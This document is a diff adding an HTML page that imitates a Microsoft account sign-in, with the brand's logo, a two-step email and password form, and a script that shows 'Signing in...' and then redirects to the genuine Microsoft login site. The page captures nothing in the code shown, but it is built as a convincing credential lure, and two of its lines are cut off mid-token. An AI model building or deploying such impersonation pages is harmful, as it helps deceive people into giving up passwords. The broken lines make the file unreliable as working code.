@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in to your account</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: white;
+      padding: 44px;
+      width: 440px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    }
+    .logo { margin-bottom: 20px; }
+    h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 20px; }
+    input {
+      width: 100%; height: 36px; padding: 6px 10px;
+      border: 1px solid #767676; margin-bottom: 16px;
+      font-size: 15px; font-family: inherit; display: block;
+    }
+    input:focus { border: 2px solid #0067b8; outline: none; }
+    .btn {
+      background: #0067b8; color: white; border: none;
+      padding: 0 24px; height: 36px; font-size: 15px;
+      cursor: pointer; float: right;
+    }
+    .btn:hover { background: #005a9e; }
+    .btn:disabled { background: #ccc; cursor: default; }
+    a { color: #0067b8; font-size: 13px; text-decoration: none; display: block; marg
+    .footer { margin-top: 40px; display: flex; gap: 16px; }
+    .footer a { color: #767676; font-size: 11px; }
+    #passwordStep { display: none; }
+    .email-display { font-size: 14px; color: #1b1b1b; margin-bottom: 16px; }
+    .back { font-size: 13px; color: #0067b8; cursor: pointer; background: none; border: none; padding: 0; margin-bottom: 12px; display: flex; align-items: center; gap: 4px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <svg width="120" height="24" viewBox="0 0 120 24" xmlns="http://www.w3.org/2000/svg">
+        <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
+        <rect x="12" y="0" width="11" height="11" fill="#7FBA00"/>
+        <rect x="0" y="12" width="11" height="11" fill="#00A4EF"/>
+        <rect x="12" y="12" width="11" height="11" fill="#FFB900"/>
+        <text x="30" y="18" font-family="Segoe UI,sans-serif" font-size="18" fill="#
+      </svg>
+    </div>
+
+    <div id="emailStep">
+      <h1>Sign in</h1>
+      <input type="email" id="email" placeholder="Email, phone, or Skype" required>
+      <div style="margin-bottom:20px">
+        <a href="#">No account? Create one!</a>
+        <a href="#">Can't access your account?</a>
+      </div>
+      <div style="overflow:hidden">
+        <button class="btn" onclick="showPassword()">Next</button>
+      </div>
+    </div>
+
+    <div id="passwordStep">
+      <button class="back" onclick="showEmail()">← <span id="emailLabel"></span></button>
+      <h1>Enter password</h1>
+      <input type="password" id="password" placeholder="Password" required>
+      <div style="margin-bottom:20px">
+        <a href="#">Forgot my password</a>
+        <a href="#">Sign-in options</a>
+      </div>
+      <div style="overflow:hidden">
+        <button class="btn" id="signInBtn" onclick="doSignIn()">Sign in</button>
+      </div>
+    </div>
+
+    <div class="footer">
+      <a href="#">Terms of use</a>
+      <a href="#">Privacy & cookies</a>
+    </div>
+  </div>
+  <script>
+    function showPassword() {
+      var e = document.getElementById('email').value;
+      if (!e) return;
+      document.getElementById('emailStep').style.display = 'none';
+      document.getElementById('emailLabel').textContent = e;
+      document.getElementById('passwordStep').style.display = 'block';
+      document.getElementById('password').focus();
+    }
+    function showEmail() {
+      document.getElementById('passwordStep').style.display = 'none';
+      document.getElementById('emailStep').style.display = 'block';
+    }
+    function doSignIn() {
+      var btn = document.getElementById('signInBtn');
+      btn.textContent = 'Signing in...';
+      btn.disabled = true;
+      setTimeout(function() {
+        window.location.href = 'https://login.microsoftonline.com';
+      }, 1500);
+    }
+    document.getElementById('password').addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') doSignIn();
+    });
+    document.getElementById('email').addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') showPassword();
+    });
+  </script>
+</body>
+</html>
